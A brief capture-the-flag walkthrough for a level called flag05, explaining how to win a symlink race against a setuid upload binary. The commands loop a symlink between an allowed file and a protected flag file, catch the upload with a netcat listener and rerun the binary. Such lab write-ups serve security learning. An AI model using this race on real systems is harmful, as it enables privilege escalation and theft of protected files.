The setuid binary /home/flag05/flag05 uploads any file given, as long as you have permission to access it.

Log in as level05 with password level05

		  This command keeps changing file, hoping that the first one passes access while
		  the second one takes the wrong file:
			
				while true; do
					ln -sf /home/flag05/flag.txt proxy
					ln -sf /home/level05/flag.txt proxy
				done
			
		  In another shell, we have to listen for outgoing files using this command:
				nc -l -k -p 18211
		  
		  Finally, we keep running the flag05 binary with this command in yet another shell:
				while true; do ../flag05/flag05 proxy 127.0.0.1; done
